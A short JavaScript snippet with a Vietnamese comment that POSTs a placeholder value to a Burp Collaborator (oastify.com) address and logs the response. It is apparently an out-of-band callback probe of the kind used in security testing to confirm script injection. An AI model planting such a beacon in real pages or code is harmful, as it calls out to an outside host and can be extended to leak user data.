var xhr = new XMLHttpRequest();
var url = "http://5io99liwzcriuzz9kxonjag9y04rskg9.oastify.com";
var params = "a";
xhr.open("POST", url, true);
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.onreadystatechange = function() {
    if(xhr.readyState == 4 && xhr.status == 200) {
        // Xử lý phản hồi từ server
        console.log(xhr.responseText);
    }
}
xhr.send(params);
